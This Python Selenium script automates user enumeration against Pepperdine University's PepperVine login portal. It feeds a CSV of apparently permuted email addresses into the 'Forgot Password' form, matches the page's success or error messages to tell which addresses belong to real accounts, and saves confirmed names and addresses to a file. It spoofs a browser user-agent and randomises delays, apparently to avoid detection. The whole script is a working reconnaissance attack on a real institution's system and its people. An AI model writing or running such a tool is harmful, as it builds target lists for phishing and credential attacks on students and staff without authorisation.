#!/usr/bin/env python3
import argparse
import csv
import os
import random
import sys
import time
from typing import Dict, Iterable, Optional, Set

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager

PORTAL_URL = "https://vine.pepperdine.edu/login_only"
SNAPSHOT_DIR = "pepp_snapshots"


def make_driver(headless: bool = True) -> webdriver.Chrome:
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1366,900")
    chrome_options.add_argument("--lang=en-US,en")
    chrome_options.add_argument(
        "--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    )

    try:
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=chrome_options)
    except TypeError:
        from selenium.webdriver.chrome.service import Service
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    return driver


def ensure_snapshot_dir():
    os.makedirs(SNAPSHOT_DIR, exist_ok=True)


def save_snapshot(driver: webdriver.Chrome, label: str):
    ensure_snapshot_dir()
    ts = int(time.time() * 1000)
    html_path = os.path.join(SNAPSHOT_DIR, f"{ts}_{label}.html")
    try:
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(driver.page_source or "")
    except Exception:
        pass


def read_input_rows(path: str) -> Iterable[Dict[str, str]]:
    with open(path, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            yield row


def try_switch_iframe(driver: webdriver.Chrome) -> None:
    try:
        driver.switch_to.default_content()
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        if len(iframes) == 1:
            driver.switch_to.frame(iframes[0])
    except Exception:
        pass


def click_close_if_present(driver: webdriver.Chrome, timeout: float = 2.0) -> bool:
    # Try in current context, default content, then iframe
    tried_scopes = ["current", "default", "frame"]
    for scope in tried_scopes:
        try:
            if scope == "default":
                driver.switch_to.default_content()
            elif scope == "frame":
                try_switch_iframe(driver)
        except Exception:
            pass
        for by, sel in [
            (By.XPATH, "//button[normalize-space()='Close']"),
            (By.XPATH, "//button[contains(translate(., 'CLOSE', 'close'), 'close')]"),
            (By.XPATH, "//button[contains(., 'OK') or contains(., 'Ok') or contains(., 'Got it') or contains(., 'Dismiss')]"),
            (By.CSS_SELECTOR, ".modal-footer .btn, .modal button.btn, .bootbox .btn-primary, .bootbox .btn")
        ]:
            try:
                btn = WebDriverWait(driver, timeout).until(EC.element_to_be_clickable((by, sel)))
                btn.click()
                time.sleep(0.1)
                return True
            except Exception:
                continue
    return False


def navigate_to_forgot(driver: webdriver.Chrome, timeout: float = 10.0) -> bool:
    driver.switch_to.default_content()
    driver.get(PORTAL_URL)
    try:
        WebDriverWait(driver, timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
    except TimeoutException:
        return False

    try_switch_iframe(driver)

    selectors = [
        (By.LINK_TEXT, "Forgot Password?"),
        (By.PARTIAL_LINK_TEXT, "Forgot Password"),
        (By.XPATH, "//a[contains(., 'Forgot Password')]"),
        (By.XPATH, "//button[contains(., 'Forgot Password')]"),
        (By.CSS_SELECTOR, "a[href*='forgot']"),
    ]
    for by, sel in selectors:
        try:
            el = WebDriverWait(driver, 3).until(EC.element_to_be_clickable((by, sel)))
            el.click()
            time.sleep(0.2)
            return True
        except Exception:
            continue

    for url in [
        "https://vine.pepperdine.edu/forgot_password",
        "https://vine.pepperdine.edu/forgot",
    ]:
        try:
            driver.get(url)
            WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            return True
        except Exception:
            continue

    save_snapshot(driver, "no_forgot_link")
    return False


def locate_reset_input(driver: webdriver.Chrome, timeout: float = 5.0):
    try_switch_iframe(driver)
    wait = WebDriverWait(driver, timeout)
    for by, sel in [
        (By.CSS_SELECTOR, "input[type='email']"),
        (By.NAME, "email"),
        (By.ID, "email"),
        (By.CSS_SELECTOR, "input[type='text']"),
        (By.NAME, "username"),
        (By.ID, "username"),
    ]:
        try:
            el = wait.until(EC.presence_of_element_located((by, sel)))
            return el
        except TimeoutException:
            continue
    return None


def locate_submit(driver: webdriver.Chrome) -> Optional[object]:
    try:
        for by, sel in [
            (By.CSS_SELECTOR, "button[type='submit']"),
            (By.XPATH, "//button[contains(., 'Submit') or contains(., 'Next') or contains(., 'Continue') or contains(., 'Send')]"),
            (By.XPATH, "//input[@type='submit']"),
        ]:
            btns = driver.find_elements(by, sel)
            if btns:
                return btns[0]
    except Exception:
        pass
    return None


def ensure_on_reset_page(driver: webdriver.Chrome) -> bool:
    inp = locate_reset_input(driver, timeout=2.0)
    if inp:
        return True
    # Try to reopen Forgot Password quickly
    if navigate_to_forgot(driver, timeout=6.0):
        return locate_reset_input(driver, timeout=3.0) is not None
    return False


def set_input_value_fast(driver: webdriver.Chrome, element, value: str):
    try:
        driver.execute_script("arguments[0].value = arguments[1];", element, value)
    except Exception:
        try:
            element.clear()
        except Exception:
            pass
        element.send_keys(value)


def submit_username_for_reset(driver: webdriver.Chrome, email: str) -> Optional[bool]:
    if not ensure_on_reset_page(driver):
        save_snapshot(driver, "cannot_open_reset")
        return None

    inp = locate_reset_input(driver, timeout=3.0)
    if not inp:
        save_snapshot(driver, "no_input")
        return None

    set_input_value_fast(driver, inp, email)
    try:
        inp.send_keys(Keys.RETURN)
    except Exception:
        pass

    btn = locate_submit(driver)
    if btn:
        try:
            btn.click()
        except Exception:
            pass

    time.sleep(0.8)

    page_lower = (driver.page_source or "").lower()
    error_hints = [
        "not recognized", "could not be found", "no account", "invalid", "doesn't match", "does not exist",
        "we could not find", "we couldn't find", "can't find", "unknown",
        "sorry, we have no record of this email address.",
        "register on peppervine",
    ]
    success_hints = [
        "email has been sent", "instructions have been sent", "reset link sent", "check your email",
        "we have emailed", "password reset", "email was sent",
    ]

    if any(h in page_lower for h in success_hints):
        click_close_if_present(driver)
        return True
    if any(h in page_lower for h in error_hints):
        click_close_if_present(driver)
        return False

    try:
        alerts = driver.find_elements(By.CSS_SELECTOR, ".alert, .error, .message, [role='alert'], .modal")
        for a in alerts:
            txt = (a.text or "").strip().lower()
            if not txt:
                continue
            if any(h in txt for h in ["not recognized", "not found", "invalid", "no account", "unknown", "no record of this email"]):
                click_close_if_present(driver)
                return False
            if any(h in txt for h in ["reset", "sent", "check your email", "emailed"]):
                click_close_if_present(driver)
                return True
    except Exception:
        pass

    save_snapshot(driver, "ambiguous")
    click_close_if_present(driver)
    return None


def main():
    parser = argparse.ArgumentParser(description="Validate Pepperdine emails via Forgot Password flow")
    parser.add_argument("input_csv", nargs="?", default="permuted_pepp_50.csv", help="CSV with an 'email' column")
    parser.add_argument("--output", "-o", default="verified_pepp.csv", help="Output CSV for valid emails")
    parser.add_argument("--no-headless", action="store_true", help="Run Chrome visible")
    parser.add_argument("--sleep-min", type=float, default=0.6, help="Minimum sleep between checks")
    parser.add_argument("--sleep-max", type=float, default=1.2, help="Maximum sleep between checks")
    parser.add_argument("--limit", type=int, default=0, help="Only process first N emails (0 = all)")
    args = parser.parse_args()

    headless = not args.no_headless
    driver = make_driver(headless=headless)

    if not navigate_to_forgot(driver):
        print("Failed to reach Forgot Password page")
        driver.quit()
        sys.exit(1)

    seen_emails: Set[str] = set()
    valid_emails: Set[str] = set()

    def write_valid(row: Dict[str, str]):
        with open(args.output, "a", newline="", encoding="utf-8") as out:
            writer = csv.DictWriter(out, fieldnames=["full_name", "email"])
            if out.tell() == 0:
                writer.writeheader()
            writer.writerow({
                "full_name": row.get("full_name", ""),
                "email": row.get("email", ""),
            })

    try:
        processed = 0
        for idx, row in enumerate(read_input_rows(args.input_csv), start=1):
            if args.limit and processed >= args.limit:
                break
            email = (row.get("email", "") or "").strip()
            if not email or email in seen_emails:
                continue
            seen_emails.add(email)

            verdict = submit_username_for_reset(driver, email)

            if verdict is True:
                write_valid(row)
                valid_emails.add(email)
            processed += 1

            if idx % 10 == 0:
                print(f"Processed {idx} emails; valid so far: {len(valid_emails)}")

            # Always reset to reset page for next loop
            ensure_on_reset_page(driver)

            time.sleep(random.uniform(args.sleep_min, args.sleep_max))

    finally:
        try:
            driver.quit()
        except Exception:
            pass

    print(f"Done. Valid emails: {len(valid_emails)}. Output: {args.output}")


if __name__ == "__main__":
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    main()
